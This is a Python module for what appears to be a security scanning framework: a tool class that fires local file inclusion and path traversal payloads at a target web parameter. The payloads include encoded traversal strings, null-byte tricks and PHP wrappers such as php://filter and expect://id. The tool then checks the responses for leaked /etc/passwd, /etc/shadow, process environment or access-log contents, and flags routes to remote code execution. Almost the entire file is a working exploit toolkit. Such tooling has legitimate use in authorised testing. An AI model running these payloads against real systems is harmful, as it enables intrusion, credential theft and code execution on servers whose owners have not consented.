"""
LFI_EXPLOIT -- Local File Inclusion / Path Traversal exploitation.

Goes beyond nuclei detection with:
  1. Path traversal with encoding bypass (URL encode, double encode, UTF-8)
  2. PHP wrapper abuse (php://filter, php://input, data://, expect://)
  3. Null byte injection (%00) for legacy handlers
  4. Double extension bypass (shell.php.jpg)
  5. File read proof (/etc/passwd, /proc/self/environ)
  6. LFI to RCE via log poisoning detection

Pure Python + requests.  Non-destructive: reads system files only.
"""

import re

import requests

from tools.base import Tool, ToolResult

# ── Path traversal payloads ────────────────────────────────────────────────

TRAVERSAL_PAYLOADS = [
    # Basic traversal
    ("../../../etc/passwd", "basic_traversal"),
    ("....//....//....//etc/passwd", "double_dot_bypass"),
    # URL encoding
    ("..%2f..%2f..%2fetc%2fpasswd", "url_encoded"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "full_url_encoded"),
    # Double URL encoding
    ("..%252f..%252f..%252fetc%252fpasswd", "double_url_encoded"),
    # UTF-8 overlong encoding
    ("..%c0%af..%c0%af..%c0%afetc/passwd", "utf8_overlong"),
    # Backslash (Windows)
    ("..\\..\\..\\etc\\passwd", "backslash"),
    # Null byte (legacy PHP < 5.3.4)
    ("../../../etc/passwd%00", "null_byte"),
    # Double extension
    ("../../../etc/passwd%00.jpg", "null_byte_ext"),
    # Filter bypass
    ("....//....//....//etc/passwd", "filter_bypass"),
]

# ── PHP wrapper payloads ───────────────────────────────────────────────────

PHP_WRAPPER_PAYLOADS = [
    # Read source code via base64 filter
    ("php://filter/convert.base64-encode/resource=/etc/passwd", "php_filter_b64"),
    ("php://filter/convert.base64-encode/resource=index.php", "php_filter_source"),
    # Read from stdin
    ("php://input", "php_input"),
    # Data URI
    ("data://text/plain;base64,SSBsb3ZlIFBIUAo=", "data_uri"),
    # Expect (RCE)
    ("expect://id", "expect_rce"),
    # PHP session file
    ("php://filter/convert.base64-encode/resource=/tmp/sess_PHPSESSID", "php_session"),
]

# ── Linux target files ─────────────────────────────────────────────────────

LINUX_FILES = [
    ("/etc/passwd", "passwd"),
    ("/etc/shadow", "shadow"),
    ("/etc/hosts", "hosts"),
    ("/proc/self/environ", "environ"),
    ("/proc/self/cmdline", "cmdline"),
    ("/var/log/apache2/access.log", "apache_log"),
    ("/var/log/nginx/access.log", "nginx_log"),
    ("/proc/version", "version"),
]

# ── Detection patterns ─────────────────────────────────────────────────────

PASSWD_PATTERNS = [
    re.compile(r"root:.+:0:0:"),
    re.compile(r"/bin/(ba)?sh"),
]

ENVIRON_PATTERNS = [
    re.compile(r"SERVER_NAME=", re.IGNORECASE),
    re.compile(r"DOCUMENT_ROOT=", re.IGNORECASE),
    re.compile(r"REQUEST_URI=", re.IGNORECASE),
]

LOG_PATTERNS = [
    re.compile(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"),
    re.compile(r"GET\s+/"),
    re.compile(r"HTTP/\d\.\d"),
]


class LFIExploitTool(Tool):
    """Local File Inclusion / Path Traversal exploitation."""

    name = "lfi_exploit"
    capability = "LFI_EXPLOIT"
    binary = ""

    def is_available(self) -> bool:
        return True

    def validate(self):
        return None

    def build_command(self, target: str, **kwargs) -> list:
        return ["python-lfi-exploit", target]

    def parse(self, stdout: str, stderr: str) -> dict:
        return {}

    def run(self, target: str, timeout: int = 30, **kwargs) -> ToolResult:
        base = kwargs.get("full_url") or (target if target.startswith("http") else f"https://{target}")
        param = kwargs.get("param", "")
        method = kwargs.get("method", "GET").upper()
        headers = kwargs.get("headers", {})
        cookies = kwargs.get("cookies", {})
        endpoint = kwargs.get("endpoint", "")

        test_url = base
        if endpoint:
            test_url = base.rstrip("/") + "/" + endpoint.lstrip("/")

        all_findings = []

        # Phase 1: Basic path traversal
        for payload, variant in TRAVERSAL_PAYLOADS:
            result = self._send_lfi_payload(test_url, param, payload, method, headers, cookies, timeout)
            if result:
                body = result.get("body", "")
                for pat in PASSWD_PATTERNS:
                    if pat.search(body):
                        all_findings.append({
                            "type": "path_traversal",
                            "variant": variant,
                            "severity": "CRITICAL",
                            "confidence": 90,
                            "url": result["url"],
                            "payload": payload,
                            "evidence": body[:300],
                            "description": f"LFI via path traversal ({variant}): /etc/passwd read at {result['url']}",
                        })
                        break

        # Phase 2: PHP wrapper abuse
        for payload, variant in PHP_WRAPPER_PAYLOADS:
            result = self._send_lfi_payload(test_url, param, payload, method, headers, cookies, timeout)
            if result:
                body = result.get("body", "")
                # Check for base64-encoded passwd content
                if "php_filter" in variant:
                    import base64
                    try:
                        decoded = base64.b64decode(body.strip()).decode("utf-8", errors="replace")
                        if any(pat.search(decoded) for pat in PASSWD_PATTERNS):
                            all_findings.append({
                                "type": "php_wrapper",
                                "variant": variant,
                                "severity": "CRITICAL",
                                "confidence": 95,
                                "url": result["url"],
                                "payload": payload,
                                "evidence": decoded[:300],
                                "description": f"LFI via PHP filter wrapper: source code/file read at {result['url']}",
                            })
                    except Exception:
                        pass
                # Check for expect RCE
                elif "expect" in variant:
                    if any(pat.search(body) for pat in [
                        re.compile(r"uid=\d+"),
                        re.compile(r"root:x:0:0"),
                    ]):
                        all_findings.append({
                            "type": "lfi_to_rce",
                            "variant": variant,
                            "severity": "CRITICAL",
                            "confidence": 95,
                            "url": result["url"],
                            "payload": payload,
                            "evidence": body[:300],
                            "description": f"LFI to RCE via expect wrapper at {result['url']}",
                        })

        # Phase 3: Sensitive file reads
        for file_path, file_label in LINUX_FILES[:5]:
            payload = f"../../../..{file_path}"
            result = self._send_lfi_payload(test_url, param, payload, method, headers, cookies, timeout)
            if result:
                body = result.get("body", "")
                if file_label == "passwd" and any(pat.search(body) for pat in PASSWD_PATTERNS):
                    all_findings.append({
                        "type": "sensitive_file_read",
                        "file": file_path,
                        "severity": "CRITICAL",
                        "confidence": 90,
                        "url": result["url"],
                        "evidence": body[:300],
                        "description": f"LFI: sensitive file {file_path} readable",
                    })
                elif file_label == "environ" and any(pat.search(body) for pat in ENVIRON_PATTERNS):
                    all_findings.append({
                        "type": "sensitive_file_read",
                        "file": file_path,
                        "severity": "HIGH",
                        "confidence": 85,
                        "url": result["url"],
                        "evidence": body[:300],
                        "description": f"LFI: process environment readable at {file_path}",
                    })
                elif file_label in ("apache_log", "nginx_log") and any(pat.search(body) for pat in LOG_PATTERNS):
                    all_findings.append({
                        "type": "log_file_read",
                        "file": file_path,
                        "severity": "HIGH",
                        "confidence": 80,
                        "url": result["url"],
                        "evidence": body[:200],
                        "description": f"LFI: log file readable — potential for log poisoning RCE at {file_path}",
                    })

        return ToolResult(tool=self.name, status="success", capability=self.capability,
                          results={"lfi_findings": all_findings, "count": len(all_findings)})

    @staticmethod
    def _send_lfi_payload(base, param, payload, method, headers, cookies, timeout):
        """Send a LFI payload via the specified parameter."""
        try:
            if method == "GET":
                sep = "&" if "?" in base else "?"
                url = f"{base}{sep}{param}={requests.utils.quote(payload, safe='')}" if param else f"{base}{sep}{requests.utils.quote(payload, safe='')}"
                r = requests.get(url, timeout=timeout, headers=headers,
                                 cookies=cookies, allow_redirects=True)
            else:
                url = base
                data = {param: payload} if param else {"file": payload}
                r = requests.post(url, timeout=timeout, headers=headers,
                                  cookies=cookies, data=data, allow_redirects=True)

            if r.status_code == 200 or (r.status_code >= 400 and len(r.text) > 100):
                return {"url": url, "status": r.status_code, "body": r.text[:15000]}
        except requests.RequestException:
            pass
        return None
